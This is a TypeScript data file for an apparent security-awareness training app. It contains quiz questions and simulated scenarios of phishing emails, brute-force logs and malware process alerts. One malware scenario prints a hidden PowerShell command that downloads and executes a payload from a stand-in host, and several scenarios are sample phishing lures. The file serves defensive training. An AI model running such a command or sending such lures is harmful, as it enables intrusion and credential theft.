
import { AttackCategory, SimulationType, QuizQuestion, SimulationScenario } from '../types';

export const QUIZ_REPOSITORY: Record<AttackCategory, QuizQuestion[]> = {
  [AttackCategory.PHISHING]: [
    {
      question: "What is the primary characteristic of 'Spear Phishing' compared to standard phishing?",
      options: [
        "It uses physical mail instead of email",
        "It is targeted at a specific individual or organization",
        "It only happens on mobile devices",
        "It involves encrypting the victim's hard drive"
      ],
      correctIndex: 1,
      explanation: "Spear phishing is a highly targeted attack where the attacker researches the victim to make the message more convincing."
    },
    {
      question: "You receive an email from 'IT Support' asking you to verify your password on a new portal. What is the safest action?",
      options: [
        "Click the link and change it immediately",
        "Reply to the email asking if it's real",
        "Go to the official company portal directly via your browser",
        "Ignore it and delete it without reporting"
      ],
      correctIndex: 2,
      explanation: "Always navigate to official sites manually. Never use links provided in unsolicited emails to enter credentials."
    },
    {
      question: "What does 'Smishing' refer to?",
      options: [
        "Phishing via Social Media",
        "Phishing via SMS / Text Messages",
        "Phishing via Small Websites",
        "Phishing via Smart Home devices"
      ],
      correctIndex: 1,
      explanation: "Smishing is phishing conducted through short message service (SMS) or text messaging."
    },
    
    {
      question: "What is a common sign of a phishing URL?",
      options: [
        "It starts with https://",
        "The domain name is slightly misspelled (e.g., mircosoft.com)",
        "The page loads very quickly",
        "It contains high-resolution images"
      ],
      correctIndex: 1,
      explanation: "Typosquatting or look-alike domains are classic indicators of a malicious site."
    },
    {
  question: "Which element in an email most commonly reveals a phishing attempt?",
  options: [
    "The sender's domain name",
    "The color of the email",
    "The font size",
    "The email length"
  ],
  correctIndex: 0,
  explanation: "Attackers often use domains that look similar to legitimate ones."
},
{
  question: "What should you do if you accidentally clicked a phishing link?",
  options: [
    "Ignore it and continue working",
    "Immediately report it to IT security",
    "Forward it to coworkers",
    "Post it online"
  ],
  correctIndex: 1,
  explanation: "Reporting immediately helps security teams prevent further damage."
},
{
  question: "What technique involves attackers creating fake websites similar to legitimate ones?",
  options: [
    "Spoofing",
    "Typosquatting",
    "Hashing",
    "Encryption"
  ],
  correctIndex: 1,
  explanation: "Typosquatting uses slightly misspelled domains to trick users."
}
  ],
  [AttackCategory.PASSWORD]: [
    {
      question: "Which of the following is the most secure way to manage multiple complex passwords?",
      options: [
        "Write them in a hidden notebook",
        "Use a reputable digital password manager",
        "Use the same password with different numbers at the end",
        "Save them in a plain text file on your desktop"
      ],
      correctIndex: 1,
      explanation: "Password managers store encrypted credentials and allow you to use unique, complex passwords for every service."
    },
    {
      question: "What is Multi-Factor Authentication (MFA)?",
      options: [
        "Using two different passwords for one account",
        "A system requiring two or more independent credentials for access",
        "Changing your password every 30 days",
        "Encrypted storage for your secret files"
      ],
      correctIndex: 1,
      explanation: "MFA requires something you know (password) and something you have (phone/token) or are (biometric)."
    },
    {
      question: "What is a 'Brute Force' attack?",
      options: [
        "Physically breaking into a server room",
        "Trial-and-error method to guess passwords or encryption keys",
        "Sending a virus to delete all passwords",
        "Using a heavy computer to process data"
      ],
      correctIndex: 1,
      explanation: "Brute force involves automated software attempting every possible combination of characters until it finds the correct one."
    },
    {
  question: "Which password is considered the strongest?",
  options: [
    "password123",
    "Company2024",
    "P@7x!qL#9vT2",
    "johnsmith"
  ],
  correctIndex: 2,
  explanation: "Strong passwords include random characters, numbers, and symbols."
},
{
  question: "What is the best defense against credential stuffing attacks?",
  options: [
    "Using simple passwords",
    "Multi-Factor Authentication",
    "Writing passwords down",
    "Sharing passwords with coworkers"
  ],
  correctIndex: 1,
  explanation: "MFA prevents attackers from logging in even if they know the password."
},
{
  question: "Why should you avoid reusing passwords?",
  options: [
    "It slows down the computer",
    "A breach in one site could compromise multiple accounts",
    "It causes login errors",
    "It wastes storage space"
  ],
  correctIndex: 1,
  explanation: "Password reuse allows attackers to access many accounts if one password leaks."
}
  ],
  [AttackCategory.MALWARE]: [
    {
    question: "What is a zero-day exploit?",
    options: [
      "An attack using outdated software",
      "An exploit unknown to the vendor",
      "A patched vulnerability",
      "A brute-force attack"
    ],
    correctIndex: 1,
    explanation: "A zero-day exploit targets vulnerabilities unknown to the vendor."
  },
  {
    question: "Which technique helps attackers evade IDS?",
    options: [
      "Packet fragmentation",
      "Strong encryption",
      "Firewall rules",
      "Hashing"
    ],
    correctIndex: 0,
    explanation: "Packet fragmentation can bypass intrusion detection systems."
  },
  {
    question: "What does lateral movement mean in a cyber attack?",
    options: [
      "Moving traffic sideways",
      "Gaining access to multiple systems within a network",
      "Changing IP addresses",
      "Blocking network ports"
    ],
    correctIndex: 1,
    explanation: "Lateral movement allows attackers to expand access inside a network."
  },
  {
    question: "Which tool is commonly used for privilege escalation?",
    options: [
      "Wireshark",
      "Mimikatz",
      "Nmap",
      "Burp Suite"
    ],
    correctIndex: 1,
    explanation: "Mimikatz is widely used for credential harvesting and privilege escalation."
  },
  {
    question: "What is the primary goal of an IDS?",
    options: [
      "Prevent attacks",
      "Detect suspicious activity",
      "Encrypt traffic",
      "Block users"
    ],
    correctIndex: 1,
    explanation: "IDS detects and alerts on malicious or suspicious activities."
  },
    {
      question: "What is 'Ransomware'?",
      options: [
        "Software that shows annoying pop-up ads",
        "Software that demands a fee to remove an infection",
        "Malware that encrypts files and demands payment for the key",
        "A virus that steals your email contacts"
      ],
      correctIndex: 2,
      explanation: "Ransomware locks your data and demands cryptocurrency payment to unlock it, with no guarantee of recovery."
    },
    {
      question: "How does a 'Trojan Horse' typically infect a system?",
      options: [
        "By exploiting a hardware bug automatically",
        "By disguising itself as legitimate or useful software",
        "By jumping through the power lines",
        "By disabling the physical firewall"
      ],
      correctIndex: 1,
      explanation: "Trojans rely on social engineering, tricking users into executing a program that looks safe but contains a hidden payload."
    }
  ],
  [AttackCategory.SOCIAL_ENGINEERING]: [
    {
  question: "What is 'pretexting' in social engineering?",
  options: [
    "Creating a fake scenario to obtain information",
    "Encrypting communication",
    "Monitoring network traffic",
    "Deleting logs"
  ],
  correctIndex: 0,
  explanation: "Pretexting involves creating a believable story to trick victims."
},
{
  question: "What is the main goal of social engineering attacks?",
  options: [
    "Breaking hardware",
    "Manipulating people to reveal information",
    "Speeding up networks",
    "Compressing files"
  ],
  correctIndex: 1,
  explanation: "Social engineering exploits human psychology rather than technical vulnerabilities."
},
{
  question: "Which example represents social engineering?",
  options: [
    "An attacker pretending to be IT support to get a password",
    "Installing antivirus software",
    "Updating operating system",
    "Encrypting a file"
  ],
  correctIndex: 0,
  explanation: "Pretending to be a trusted person is a classic social engineering tactic."
},
    {
    question: "What is chain of custody in digital forensics?",
    options: [
      "Encryption process",
      "Documentation of evidence handling",
      "Malware detection method",
      "Network tracing"
    ],
    correctIndex: 1,
    explanation: "Chain of custody ensures evidence integrity during investigation."
  },
  {
    question: "Which file system is commonly analyzed in Windows forensics?",
    options: [
      "EXT4",
      "FAT32",
      "NTFS",
      "APFS"
    ],
    correctIndex: 2,
    explanation: "NTFS is the primary file system used in Windows."
  },
  {
    question: "What does hashing ensure in digital evidence?",
    options: [
      "Encryption",
      "Compression",
      "Integrity",
      "Availability"
    ],
    correctIndex: 2,
    explanation: "Hashing ensures data integrity by detecting changes."
  },
  {
    question: "Which artifact helps determine USB usage?",
    options: [
      "Browser cache",
      "Registry entries",
      "Firewall logs",
      "DNS cache"
    ],
    correctIndex: 1,
    explanation: "Windows Registry stores USB device connection data."
  },
  {
    question: "What is volatile data?",
    options: [
      "Encrypted data",
      "Data lost when power is off",
      "Compressed data",
      "Deleted data"
    ],
    correctIndex: 1,
    explanation: "Volatile data exists only while the system is powered on."
  },
    {
      question: "What is 'Tailgating' in a security context?",
      options: [
        "Following someone too closely in traffic",
        "Entering a secure building by following an authorized person",
        "Monitoring someone's internet history",
        "Using a fake ID card"
      ],
      correctIndex: 1,
      explanation: "Tailgating is a physical social engineering attack where an unauthorized person slips through a door behind someone with access."
    }
  ]
};

export const SIMULATION_REPOSITORY: SimulationScenario[] = [
  // --- PHISHING SCENARIOS ---
  {
    type: SimulationType.PHISHING,
    title: "Urgent: Payroll Discrepancy",
    isThreat: true,
    content: {
      header: "hr-noreply@company-portal-update.com",
      subHeader: "Urgent: Action Required on Your Benefits",
      body: "Dear Employee,\n\nOur records indicate a discrepancy in your recent payroll tax withholding. Please click the link below to verify your social security number and banking details immediately to avoid a delay in your next paycheck.\n\n[Link: http://secure-verify-payroll.net/auth]\n\nFailure to comply by EOD will result in automatic suspension of direct deposit.\n\nRegards,\nCorporate HR Team"
    },
    redFlags: [
      "Mismatched domain (company-portal-update.com vs company.com)",
      "Sense of extreme urgency and threats",
      "Request for sensitive PII (SSN) via an unverified link",
      "Generic greeting ('Dear Employee')"
    ]
  },
  {
    type: SimulationType.PHISHING,
    title: "IT Security Alert",
    isThreat: true,
    content: {
      header: "security-alert@microsoft-office365.co",
      subHeader: "Suspicious Login Detected",
      body: "Alert: A login to your account was detected from a location in Moscow, Russia (IP: 95.161.224.11).\n\nIf this was not you, please secure your account immediately by clicking the button below and validating your credentials.\n\n[Button: Secure Account Now]\n\nSecurity Team"
    },
    redFlags: [
      "Suspicious top-level domain (.co instead of .com)",
      "Fear-based tactic using a foreign location",
      "Button hides the actual URL (likely a credential harvester)",
      "Lack of specific user details"
    ]
  },
  {
    type: SimulationType.PHISHING,
    title: "Internal Meeting Invite",
    isThreat: false,
    content: {
      header: "sarah.jones@yourcompany.com",
      subHeader: "Marketing Sync - Q3 Goals",
      body: "Hi Team,\n\nI've added a placeholder for our Q3 goals sync tomorrow at 10 AM. The Zoom link is the usual one in our shared calendar.\n\nLet me know if you have any agenda items to add.\n\nBest,\nSarah"
    },
    redFlags: [
      "Correct internal company domain",
      "No urgent or threatening language",
      "Refers to established internal resources (Zoom/Shared Calendar)",
      "Specific context relevant to the workplace"
    ]
  },
  {
    type: SimulationType.PHISHING,
    title: "Delivery Failure Notification",
    isThreat: true,
    content: {
      header: "tracking-info@ups-delivery-service.com",
      subHeader: "Package 772189: Delivery Attempt Failed",
      body: "We were unable to deliver your package today due to an incomplete address. To reschedule delivery, please download the attached shipping invoice (Invoice_772189.zip) and present it at your local hub.\n\nFailure to collect within 48 hours will result in the package being returned to sender."
    },
    redFlags: [
      "Request to download a .zip attachment (common malware vector)",
      "Vague 'local hub' instead of specific address",
      "Artificial 48-hour deadline",
      "Sender domain is not the official ups.com"
    ]
  },

  // --- PASSWORD ATTACK SCENARIOS ---
  {
    type: SimulationType.PASSWORD_ATTACK,
    title: "Auth Gateway Monitor",
    isThreat: true,
    content: {
      header: "GATEWAY_04",
      subHeader: "CRITICAL_ALERT",
      body: "TIMESTAMP: 14:02:11 - ERR_AUTH_FAIL [User: admin] - IP: 192.168.1.45\nTIMESTAMP: 14:02:12 - ERR_AUTH_FAIL [User: admin] - IP: 192.168.1.45\nTIMESTAMP: 14:02:13 - ERR_AUTH_FAIL [User: admin] - IP: 192.168.1.45\nTIMESTAMP: 14:02:14 - ERR_AUTH_FAIL [User: admin] - IP: 192.168.1.45\nTIMESTAMP: 14:02:15 - ERR_AUTH_FAIL [User: admin] - IP: 192.168.1.45"
    },
    redFlags: [
      "High frequency of failed attempts (1 per second)",
      "Targeting 'admin' account (high-value target)",
      "Sequential timestamps indicating automated brute force"
    ]
  },
  {
    type: SimulationType.PASSWORD_ATTACK,
    title: "Global Credential Audit",
    isThreat: true,
    content: {
      header: "SIEM_LOG_ANALYZER",
      subHeader: "Credential Stuffing Pattern",
      body: "DETECTED: 50 unique user login failures within 30 seconds.\nSOURCE_IP: 104.28.19.244 (Cloud Proxy)\nPATTERN: One login attempt per unique username.\nERROR_CODE: INVALID_PASSWORD"
    },
    redFlags: [
      "Multiple unique accounts targeted simultaneously",
      "Source IP is a known proxy/VPN",
      "Signature of 'Credential Stuffing' (using leaked databases)"
    ]
  },
  {
    type: SimulationType.PASSWORD_ATTACK,
    title: "User Self-Service Log",
    isThreat: false,
    content: {
      header: "SSO_LOG",
      subHeader: "Password Reset Event",
      body: "TIMESTAMP: 09:15:00 - LOGIN_FAIL [User: j.doe@company.com]\nTIMESTAMP: 09:15:22 - PWD_RESET_REQ [User: j.doe@company.com]\nTIMESTAMP: 09:16:45 - MFA_VERIFIED [User: j.doe@company.com]\nTIMESTAMP: 09:17:10 - LOGIN_SUCCESS [User: j.doe@company.com]"
    },
    redFlags: [
      "Human-speed timing between events",
      "Successful MFA verification",
      "Legitimate recovery workflow sequence"
    ]
  },

  // --- MALWARE BEHAVIOR SCENARIOS ---
  {
    type: SimulationType.MALWARE_BEHAVIOR,
    title: "Process Anomaly Detected",
    isThreat: true,
    content: {
      header: "svc_host_update.exe",
      subHeader: "C:\\Users\\Public\\Downloads\\",
      body: "Process spawned from temp directory.\nAttempting to modify registry key: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nOpening 4,000+ file handles for .docx, .pdf, .jpg in user documents.\nStarting AES-256 encryption routine on found handles."
    },
    redFlags: [
      "Process running from a Public/Downloads directory",
      "Massive file access in a short window",
      "Unsolicited encryption behavior (Ransomware signature)",
      "Attempting to establish persistence in Registry"
    ]
  },
  {
    type: SimulationType.MALWARE_BEHAVIOR,
    title: "Inbound Network Monitor",
    isThreat: true,
    content: {
      header: "powershell.exe",
      subHeader: "Network Activity: Port 443",
      body: "Command Executed: powershell -WindowStyle Hidden -Command \"iex (New-Object Net.WebClient).DownloadString('http://evil-server.net/payload.ps1')\"\nDestination: 185.25.33.102:443\nData Sent: 512KB (System Metadata)"
    },
    redFlags: [
      "Hidden window PowerShell execution",
      "Execution of remote code string ('iex')",
      "Outbound system metadata transfer to unknown IP",
      "Signature of a 'Fileless' malware stager"
    ]
  },
  {
    type: SimulationType.MALWARE_BEHAVIOR,
    title: "Standard System Service",
    isThreat: false,
    content: {
      header: "Chrome.exe",
      subHeader: "C:\\Program Files\\Google\\Chrome\\",
      body: "Multiple child processes spawned for tab rendering.\nReading from local cache directory: %AppData%\\Local\\Google\\Chrome\\User Data\\Default\\Cache\nNetwork traffic detected on Port 443 to known Google Edge nodes."
    },
    redFlags: [
      "Running from protected Program Files directory",
      "Expected behavior for a web browser",
      "Accessing own application data folders",
      "Verified digital signature from Google LLC"
    ]
  },
  {
    type: SimulationType.MALWARE_BEHAVIOR,
    title: "Keystroke Logger Monitor",
    isThreat: true,
    content: {
      header: "win_audio_driver.exe",
      subHeader: "Hooking: user32.dll!SetWindowsHookExA",
      body: "Process initialized global keyboard hook (WH_KEYBOARD_LL).\nCreating hidden log file: C:\\Windows\\Temp\\~df721.tmp\nMonitoring focus transitions on browser windows and banking portals."
    },
    redFlags: [
      "Audio driver process performing keyboard hooking",
      "Writing to hidden temp files",
      "Monitoring specific sensitive application focus",
      "Classic 'Spyware/Keylogger' behavior"
    ]
  }
];
